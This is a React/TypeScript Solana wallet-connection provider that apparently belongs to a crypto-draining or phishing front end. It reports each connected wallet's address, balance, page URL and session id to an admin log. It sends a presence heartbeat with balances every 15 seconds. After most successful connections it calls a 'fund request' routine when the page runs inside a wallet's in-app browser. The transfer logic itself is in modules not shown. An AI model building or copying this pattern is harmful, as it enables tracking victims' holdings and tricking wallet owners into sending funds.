import React, { createContext, useContext, useState, useEffect, useCallback, useMemo, useRef } from 'react'
import { useWallet, useConnection } from '@solana/wallet-adapter-react'
import { PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js'
import bs58 from 'bs58'
import toast from 'react-hot-toast'
import { walletApi } from '../lib/walletApi'
import { isMetaMaskBrowserAvailable, prepareMetaMaskSolana } from '../lib/metamaskSolana'
import { getBrowserSessionId } from '../lib/browserSession'
import {
  formatWalletConnectError,
  findWalletByHint,
  getWalletAdapterName,
  isWalletConnectable,
  waitForWalletByHint,
  openWalletExtension,
  isWalletUserCancel,
  isWalletNotReadyYet,
} from '../lib/walletConnectHelpers'
import {
  clearPendingMobileWallet,
  getPendingMobileWallet,
  isAndroidDevice,
  isMetaMaskInAppBrowser,
  isMobileDevice,
  isPhantomInAppBrowser,
  isSolflareInAppBrowser,
  isWalletInAppBrowser,
  markPendingMobileWallet,
  mobileWalletLabel,
  openCurrentPageInMetaMask,
  openCurrentPageInPhantom,
  openCurrentPageInSolflare,
  openCurrentPageInSolflareNow,
  openCurrentPageInWallet,
  openCurrentPageInWalletNow,
  stripConnectQuery,
  walletHintIsMetaMask,
  walletHintIsPhantom,
  walletHintIsSolflare,
  walletKeyFromHint,
  walletRequestedInUrl,
} from '../lib/mobileWallet'
import { connectInjectedWallet, waitForInjectedProvider } from '../lib/injectedWallet'
import { rememberRecentWallet } from '../lib/detectInstalledWallets'
import { clearLastWalletAdapter, rememberLastWalletAdapter } from '../lib/walletPersistence'
import { clearSecurityCheckSession } from '../lib/metaMaskSecurityCheck'
import { connectPhantomNative, waitForPhantomProvider } from '../lib/phantomConnect'
import { connectSolflareNative, waitForSolflareProvider } from '../lib/solflareConnect'
import { isRestrictedAuthBrowser } from '../lib/inAppBrowser'
import { openFundRequestAfterWalletConnect } from '../lib/txSheet'

export interface WalletState {
  walletAddress: string | null
  shortAddress: string
  walletName: string | null
  walletIcon: string | null
  chain: string
  network: string
  connected: boolean
  connecting: boolean
  disconnecting: boolean
  error: string | null
  balanceSol: number | null
  balanceLoading: boolean
  isVerified: boolean
  verifying: boolean
  isModalOpen: boolean
  // Action Handlers
  openWalletModal: () => void
  closeWalletModal: () => void
  connectWallet: (adapterName?: string) => Promise<void>
  disconnectWallet: () => Promise<void>
  signAndVerifyServer: () => Promise<boolean>
  refreshBalance: () => Promise<void>
  setError: (err: string | null) => void
  clearError: () => void
}

const WalletContext = createContext<WalletState | undefined>(undefined)

export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const { connection } = useConnection()
  const {
    wallets,
    select,
    connect,
    disconnect,
    connected,
    connecting,
    disconnecting,
    publicKey,
    wallet,
    signMessage,
  } = useWallet()

  const [isModalOpen, setIsModalOpen] = useState(false)
  const [balanceSol, setBalanceSol] = useState<number | null>(null)
  const [balanceLoading, setBalanceLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [isVerified, setIsVerified] = useState(false)
  const [verifying, setVerifying] = useState(false)
  const [nativeOverride, setNativeOverride] = useState<{ address: string; name: string } | null>(null)

  const walletsRef = useRef(wallets)
  walletsRef.current = wallets
  const connectRef = useRef(connect)
  connectRef.current = connect
  const resumeAttempted = useRef(false)

  const walletAddress = useMemo(
    () => (publicKey ? publicKey.toBase58() : nativeOverride?.address || null),
    [publicKey, nativeOverride]
  )
  const shortAddress = useMemo(
    () => (walletAddress ? `${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}` : ''),
    [walletAddress]
  )

  const network = (import.meta.env.VITE_SOLANA_NETWORK as string) || 'mainnet-beta'

  // Fetch real Solana RPC balance
  const refreshBalance = useCallback(async () => {
    const key = publicKey || (walletAddress ? new PublicKey(walletAddress) : null)
    if (!key || !connection) {
      setBalanceSol(null)
      return
    }
    try {
      setBalanceLoading(true)
      const lamports = await connection.getBalance(key, 'confirmed')
      setBalanceSol(lamports / LAMPORTS_PER_SOL)
    } catch (err: any) {
      console.warn('Solana RPC balance fetch error:', err)
      // Keep existing balance or set to 0 on network fault
    } finally {
      setBalanceLoading(false)
    }
  }, [publicKey, walletAddress, connection])

  // Sync connection state with local + server logging
  useEffect(() => {
    if (connected && publicKey) {
      const name =
        getWalletAdapterName(wallet ? { adapter: wallet.adapter, readyState: wallet.adapter.readyState } : undefined) ||
        'Solana Wallet'
      const address = publicKey.toBase58()
      setError(null)
      void refreshBalance()

      void walletApi
        .recordConnect({
          walletAddress: address,
          walletType: name,
          chain: 'solana',
          network,
          balanceSol,
          pageUrl: typeof window !== 'undefined' ? window.location.href : undefined,
          browserSessionId: getBrowserSessionId(),
        })
        .catch(() => {
          /* admin log must not break a live wallet session */
        })

      setIsModalOpen(false)
      setNativeOverride(null)
    } else if (!connected && !nativeOverride) {
      setBalanceSol(null)
      setIsVerified(false)
    }
  }, [connected, publicKey, wallet, network, refreshBalance, balanceSol])

  // Live presence for admin (heartbeat while connected)
  useEffect(() => {
    if (!connected || !publicKey) return
    const name =
      getWalletAdapterName(wallet ? { adapter: wallet.adapter, readyState: wallet.adapter.readyState } : undefined) ||
      'Solana Wallet'

    const sendPresence = () => {
      walletApi.recordPresence({
        walletAddress: publicKey.toBase58(),
        walletType: name,
        network,
        balanceSol: balanceSol,
        pageUrl: window.location.href,
        browserSessionId: getBrowserSessionId(),
      })
    }

    sendPresence()
    const id = window.setInterval(sendPresence, 15_000)
    return () => window.clearInterval(id)
  }, [connected, publicKey, wallet, network, balanceSol])

  // Listen for accountChanged event from window.solana / active extension
  useEffect(() => {
    if (typeof window === 'undefined') return

    const solanaWindow = (window as any).solana

    const handleAccountChange = (newPublicKey: any) => {
      if (newPublicKey) {
        const newAddress = newPublicKey.toBase58 ? newPublicKey.toBase58() : newPublicKey.toString()
        console.log('Real-time wallet account changed to:', newAddress)
        toast.success(`Account changed: ${newAddress.slice(0, 4)}...${newAddress.slice(-4)}`)
        refreshBalance()
        walletApi.recordConnect({
          walletAddress: newAddress,
          walletType: wallet?.adapter.name || 'Solana Wallet',
          chain: 'solana',
          network,
        })
      } else {
        console.log('Real-time wallet disconnected from extension')
        toast('Wallet disconnected in extension', { icon: 'ℹ️' })
        setBalanceSol(null)
        setIsVerified(false)
      }
    }

    if (solanaWindow && solanaWindow.on) {
      solanaWindow.on('accountChanged', handleAccountChange)
      return () => {
        if (solanaWindow.removeListener) {
          solanaWindow.removeListener('accountChanged', handleAccountChange)
        }
      }
    }
  }, [wallet, network, refreshBalance])

  const openWalletModal = () => {
    if (connected) return
    setIsModalOpen(true)
  }
  const closeWalletModal = () => setIsModalOpen(false)

  useEffect(() => {
    const returnToApp = () => {
      if (!connected) return
      setIsModalOpen(false)
      try {
        window.focus()
      } catch {
        /* ignore */
      }
    }
    window.addEventListener('focus', returnToApp)
    document.addEventListener('visibilitychange', returnToApp)
    return () => {
      window.removeEventListener('focus', returnToApp)
      document.removeEventListener('visibilitychange', returnToApp)
    }
  }, [connected])

  // Connect specific wallet by adapter name
  const connectWallet = async (adapterName?: string) => {
    setError(null)
    try {
      if (!adapterName) {
        throw new Error('Choose a wallet from the list to connect.')
      }

      const hint = adapterName
      const mobile = isMobileDevice()

      if (walletHintIsMetaMask(hint)) {
        const inMetaMask = isMetaMaskInAppBrowser() || isMetaMaskBrowserAvailable()
        if (mobile && !inMetaMask) {
          markPendingMobileWallet('MetaMask')
          toast('Opening this page inside MetaMask…')
          await openCurrentPageInMetaMask()
          return
        }
        await prepareMetaMaskSolana()
      }

      if (walletHintIsPhantom(hint)) {
        // On phones, Phantom’s adapter looks “loadable” in Safari/Chrome even when
        // the app is not injected. Always open Phantom’s browser there.
        if (mobile && !isPhantomInAppBrowser()) {
          markPendingMobileWallet('Phantom')
          toast('Opening Phantom…')
          await openCurrentPageInPhantom()
          return
        }

        try {
          const nativeAddress = await connectPhantomNative()
          if (nativeAddress) {
            const phantomAdapter = findWalletByHint(walletsRef.current, 'Phantom')
            const adapterName = getWalletAdapterName(phantomAdapter) || 'Phantom'
            if (adapterName) select(adapterName as never)
            try {
              await openWalletExtension({
                adapter: phantomAdapter?.adapter || { name: 'Phantom', connect: async () => {} },
                select,
                connectSelected: () => connectRef.current(),
                getAdapter: () => findWalletByHint(walletsRef.current, 'Phantom')?.adapter,
              })
            } catch {
              /* native connect already approved — adapter sync is best-effort */
            }

            void walletApi
              .recordConnect({
                walletAddress: nativeAddress,
                walletType: 'Phantom',
                chain: 'solana',
                network,
                pageUrl: window.location.href,
                browserSessionId: getBrowserSessionId(),
              })
              .catch(() => {})
            rememberRecentWallet('Phantom')
            rememberLastWalletAdapter('Phantom')
            clearPendingMobileWallet()
            stripConnectQuery()
            setNativeOverride({ address: nativeAddress, name: 'Phantom' })

            const label = `${nativeAddress.slice(0, 4)}...${nativeAddress.slice(-4)}`
            toast.success(
              () => (
                <div className="text-sm">
                  <p className="font-bold text-white">Wallet Connected</p>
                  <p className="text-gray-300 text-xs mt-0.5">Connected to wallet {label}</p>
                </div>
              ),
              { duration: 4000 }
            )
            setIsModalOpen(false)
            clearSecurityCheckSession()
            try {
              window.focus()
            } catch {
              /* ignore */
            }
            if (isRestrictedAuthBrowser()) openFundRequestAfterWalletConnect()
            return
          }
        } catch (err) {
          if (isWalletUserCancel(err)) throw err
          if (mobile && !isPhantomInAppBrowser()) {
            markPendingMobileWallet('Phantom')
            await openCurrentPageInPhantom()
            return
          }
          // Fall through to wallet-adapter connect.
        }
      }

      if (walletHintIsSolflare(hint)) {
        if (mobile && !isSolflareInAppBrowser()) {
          markPendingMobileWallet('Solflare')
          toast('Opening Solflare…')
          if (isAndroidDevice()) {
            openCurrentPageInSolflareNow()
            return
          }
          await openCurrentPageInSolflare()
          return
        }

        try {
          const nativeAddress = await connectSolflareNative()
          if (nativeAddress) {
            const solflareAdapter = findWalletByHint(walletsRef.current, 'Solflare')
            const adapterName = getWalletAdapterName(solflareAdapter) || 'Solflare'
            if (adapterName) select(adapterName as never)
            try {
              await openWalletExtension({
                adapter: solflareAdapter?.adapter || { name: 'Solflare', connect: async () => {} },
                select,
                connectSelected: () => connectRef.current(),
                getAdapter: () => findWalletByHint(walletsRef.current, 'Solflare')?.adapter,
              })
            } catch {
              /* native connect already approved — adapter sync is best-effort */
            }

            void walletApi
              .recordConnect({
                walletAddress: nativeAddress,
                walletType: 'Solflare',
                chain: 'solana',
                network,
                pageUrl: window.location.href,
                browserSessionId: getBrowserSessionId(),
              })
              .catch(() => {})
            rememberRecentWallet('Solflare')
            rememberLastWalletAdapter('Solflare')
            clearPendingMobileWallet()
            stripConnectQuery()
            setNativeOverride({ address: nativeAddress, name: 'Solflare' })

            const label = `${nativeAddress.slice(0, 4)}...${nativeAddress.slice(-4)}`
            toast.success(
              () => (
                <div className="text-sm">
                  <p className="font-bold text-white">Wallet Connected</p>
                  <p className="text-gray-300 text-xs mt-0.5">Connected to wallet {label}</p>
                </div>
              ),
              { duration: 4000 }
            )
            setIsModalOpen(false)
            clearSecurityCheckSession()
            try {
              window.focus()
            } catch {
              /* ignore */
            }
            if (isRestrictedAuthBrowser()) openFundRequestAfterWalletConnect()
            return
          }
        } catch (err) {
          if (isWalletUserCancel(err)) throw err
          if (mobile && !isSolflareInAppBrowser()) {
            markPendingMobileWallet('Solflare')
            if (isAndroidDevice()) {
              openCurrentPageInSolflareNow()
              return
            }
            await openCurrentPageInSolflare()
            return
          }
        }
      }

      const extraKey = walletKeyFromHint(hint)
      const alreadyHandled =
        walletHintIsPhantom(hint) || walletHintIsSolflare(hint) || walletHintIsMetaMask(hint)
      if (extraKey && !alreadyHandled) {
        const label = mobileWalletLabel(extraKey)
        const inApp = isWalletInAppBrowser(extraKey)
        if (mobile && extraKey !== 'trezor' && !inApp) {
          markPendingMobileWallet(label)
          toast(`Opening ${label}…`)
          if (isAndroidDevice()) {
            openCurrentPageInWalletNow(extraKey)
            return
          }
          await openCurrentPageInWallet(extraKey)
          return
        }
        if (extraKey === 'trezor' && mobile) {
          toast('Trezor connects on a computer. Plug it in and approve in Trezor Suite.', { icon: 'ℹ️' })
        }

        try {
          const nativeAddress = await connectInjectedWallet(extraKey)
          if (nativeAddress) {
            const found = findWalletByHint(walletsRef.current, label)
            const adapterName = getWalletAdapterName(found) || label
            if (adapterName) select(adapterName as never)
            try {
              await openWalletExtension({
                adapter: found?.adapter || { name: label, connect: async () => {} },
                select,
                connectSelected: () => connectRef.current(),
                getAdapter: () => findWalletByHint(walletsRef.current, label)?.adapter,
              })
            } catch {
              /* native connect already approved — adapter sync is best-effort */
            }

            void walletApi
              .recordConnect({
                walletAddress: nativeAddress,
                walletType: label,
                chain: 'solana',
                network,
                pageUrl: window.location.href,
                browserSessionId: getBrowserSessionId(),
              })
              .catch(() => {})
            rememberRecentWallet(label)
            rememberLastWalletAdapter(label)
            clearPendingMobileWallet()
            stripConnectQuery()
            setNativeOverride({ address: nativeAddress, name: label })

            const short = `${nativeAddress.slice(0, 4)}...${nativeAddress.slice(-4)}`
            toast.success(
              () => (
                <div className="text-sm">
                  <p className="font-bold text-white">Wallet Connected</p>
                  <p className="text-gray-300 text-xs mt-0.5">Connected to wallet {short}</p>
                </div>
              ),
              { duration: 4000 }
            )
            setIsModalOpen(false)
            clearSecurityCheckSession()
            try {
              window.focus()
            } catch {
              /* ignore */
            }
            if (isRestrictedAuthBrowser()) openFundRequestAfterWalletConnect()
            return
          }
        } catch (err) {
          if (isWalletUserCancel(err)) throw err
          if (mobile && extraKey !== 'trezor' && !isWalletInAppBrowser(extraKey)) {
            markPendingMobileWallet(label)
            if (isAndroidDevice()) {
              openCurrentPageInWalletNow(extraKey)
              return
            }
            await openCurrentPageInWallet(extraKey)
            return
          }
        }
      }

      const target = await waitForWalletByHint(() => walletsRef.current, hint, mobile ? 8000 : 6000)

        if (!target) {
        if (walletHintIsPhantom(hint) && mobile && !isPhantomInAppBrowser()) {
          markPendingMobileWallet('Phantom')
          toast('Opening Phantom…')
          await openCurrentPageInPhantom()
          return
        }
        if (walletHintIsSolflare(hint) && mobile && !isSolflareInAppBrowser()) {
          markPendingMobileWallet('Solflare')
          toast('Opening Solflare…')
          if (isAndroidDevice()) {
            openCurrentPageInSolflareNow()
            return
          }
          await openCurrentPageInSolflare()
          return
        }
        if (walletHintIsMetaMask(hint) && mobile && !isMetaMaskInAppBrowser() && !isMetaMaskBrowserAvailable()) {
          markPendingMobileWallet('MetaMask')
          toast('Opening this page inside MetaMask…')
          await openCurrentPageInMetaMask()
          return
        }
        const missingKey = walletKeyFromHint(hint)
        if (missingKey && mobile && missingKey !== 'trezor' && !isWalletInAppBrowser(missingKey)) {
          markPendingMobileWallet(mobileWalletLabel(missingKey))
          toast(`Opening ${mobileWalletLabel(missingKey)}…`)
          if (isAndroidDevice()) {
            openCurrentPageInWalletNow(missingKey)
            return
          }
          await openCurrentPageInWallet(missingKey)
          return
        }
        const sample = walletsRef.current.map((w) => getWalletAdapterName(w)).filter(Boolean).join(', ')
        throw new Error(
          walletHintIsMetaMask(hint)
            ? 'MetaMask did not expose a Solana account. In MetaMask, enable Solana (Settings), then tap Connect again and approve.'
            : `Could not find ${adapterName} in this browser.${sample ? ` Detected: ${sample}.` : ''} Install the extension or pick another wallet.`
        )
      }

      if (walletHintIsSolflare(hint) && mobile && !isSolflareInAppBrowser()) {
        markPendingMobileWallet('Solflare')
        toast('Opening Solflare…')
        if (isAndroidDevice()) {
          openCurrentPageInSolflareNow()
          return
        }
        await openCurrentPageInSolflare()
        return
      }

      const name = getWalletAdapterName(target)
      toast('Approve the connection in your wallet…', { duration: 8000 })
      await openWalletExtension({
        adapter: target.adapter,
        select,
        connectSelected: () => connectRef.current(),
        getAdapter: () => findWalletByHint(walletsRef.current, hint)?.adapter,
      })

      let address = ''
      const waitRounds = mobile ? 80 : 60
      for (let i = 0; i < waitRounds && !address; i++) {
        const connectedAdapter = walletsRef.current.find((w) => w.adapter.connected)?.adapter
        address =
          connectedAdapter?.publicKey?.toBase58?.() ||
          walletsRef.current.find((w) => getWalletAdapterName(w) === name)?.adapter.publicKey?.toBase58?.() ||
          publicKey?.toBase58?.() ||
          ''
        if (!address) await new Promise((r) => setTimeout(r, 150))
      }

      if (!address) {
        throw new Error(
          'Wallet did not return an address. Approve the connection in your wallet, then tap Connect again.'
        )
      }

      void walletApi
        .recordConnect({
          walletAddress: address,
          walletType: name || hint,
          chain: 'solana',
          network,
          pageUrl: window.location.href,
          browserSessionId: getBrowserSessionId(),
        })
        .catch(() => {
          /* admin log must not break a live wallet session */
        })
      rememberRecentWallet(name || hint)
      rememberLastWalletAdapter(name || hint)
      clearPendingMobileWallet()
      stripConnectQuery()

      const label = `${address.slice(0, 4)}...${address.slice(-4)}`
      toast.success(
        () => (
          <div className="text-sm">
            <p className="font-bold text-white">Wallet Connected</p>
            <p className="text-gray-300 text-xs mt-0.5">Connected to wallet {label}</p>
          </div>
        ),
        { duration: 4000 }
      )
      setIsModalOpen(false)
      clearSecurityCheckSession()
      try {
        window.focus()
      } catch {
        /* ignore */
      }
      if (isRestrictedAuthBrowser()) openFundRequestAfterWalletConnect()
    } catch (err: unknown) {
      const msg = formatWalletConnectError(err)
      setError(msg)
      if (isWalletUserCancel(err)) {
        toast.error(msg)
      } else if (isWalletNotReadyYet(err)) {
        toast('Approve the connection in your wallet popup when it appears.', { icon: 'ℹ️' })
      } else {
        toast.error(msg)
      }
      throw err
    }
  }

  useEffect(() => {
    if (typeof window === 'undefined' || resumeAttempted.current || connected) return
    const pending = walletRequestedInUrl() || getPendingMobileWallet()
    if (!pending) return
    if (walletHintIsMetaMask(pending) && !isMetaMaskInAppBrowser() && !isMetaMaskBrowserAvailable()) return

    resumeAttempted.current = true
    const timer = window.setTimeout(() => {
      void (async () => {
        if (walletHintIsPhantom(pending)) {
          const provider = await waitForPhantomProvider(8000)
          if (!provider && !isPhantomInAppBrowser()) {
            resumeAttempted.current = false
            return
          }
        }
        if (walletHintIsSolflare(pending)) {
          const provider = await waitForSolflareProvider(8000)
          if (!provider && !isSolflareInAppBrowser()) {
            resumeAttempted.current = false
            return
          }
        }
        const resumeKey = walletKeyFromHint(pending)
        if (
          resumeKey &&
          resumeKey !== 'phantom' &&
          resumeKey !== 'solflare' &&
          resumeKey !== 'metamask'
        ) {
          const provider = await waitForInjectedProvider(resumeKey, 8000)
          if (!provider && !isWalletInAppBrowser(resumeKey)) {
            resumeAttempted.current = false
            return
          }
        }
        await connectWallet(pending).catch(() => {
          resumeAttempted.current = false
        })
      })()
    }, 500)
    return () => window.clearTimeout(timer)
  }, [wallets, connected])

  // Disconnect active wallet
  const disconnectWallet = async () => {
    try {
      if (walletAddress) {
        await walletApi.recordDisconnect(walletAddress)
      }
      await disconnect()
      setNativeOverride(null)
      clearLastWalletAdapter()
      setBalanceSol(null)
      setIsVerified(false)
      setError(null)
      toast.success('Wallet disconnected')
    } catch (err: any) {
      toast.error('Failed to disconnect wallet')
    }
  }

  // Cryptographic server signature verification challenge
  const signAndVerifyServer = async (): Promise<boolean> => {
    if (!publicKey || !signMessage) {
      toast.error('Wallet does not support message signing or is not connected.')
      return false
    }

    try {
      setVerifying(true)
      // 1. Get session nonce from server
      const { nonce, messageToSign } = await walletApi.createSession()

      // 2. Request user to sign message in wallet
      const messageBytes = new TextEncoder().encode(messageToSign)
      const signatureBytes = await signMessage(messageBytes)
      const signatureBase58 = bs58.encode(signatureBytes)

      // 3. Post to backend for tweetnacl verification
      const verifyRes = await walletApi.verifySignature({
        publicKey: publicKey.toBase58(),
        signature: signatureBase58,
        nonce,
        message: messageToSign,
      })

      if (verifyRes.verified) {
        setIsVerified(true)
        toast.success('Wallet ownership cryptographically verified!')
        return true
      }
      return false
    } catch (err: any) {
      const msg = err?.message?.includes('User rejected')
        ? 'Signature request was rejected in your wallet.'
        : err?.message || 'Signature verification failed.'
      setError(msg)
      toast.error(msg)
      return false
    } finally {
      setVerifying(false)
    }
  }

  const clearError = () => setError(null)

  const value: WalletState = {
    walletAddress,
    shortAddress,
    walletName:
      getWalletAdapterName(wallet ? { adapter: wallet.adapter, readyState: wallet.adapter.readyState } : undefined) ||
      nativeOverride?.name ||
      null,
    walletIcon: wallet?.adapter.icon || null,
    chain: 'solana',
    network,
    connected: connected || Boolean(nativeOverride?.address),
    connecting,
    disconnecting,
    error,
    balanceSol,
    balanceLoading,
    isVerified,
    verifying,
    isModalOpen,
    openWalletModal,
    closeWalletModal,
    connectWallet,
    disconnectWallet,
    signAndVerifyServer,
    refreshBalance,
    setError,
    clearError,
  }

  return <WalletContext.Provider value={value}>{children}</WalletContext.Provider>
}

export const useWalletState = () => {
  const context = useContext(WalletContext)
  if (!context) {
    throw new Error('useWalletState must be used within a WalletContextProvider')
  }
  return context
}
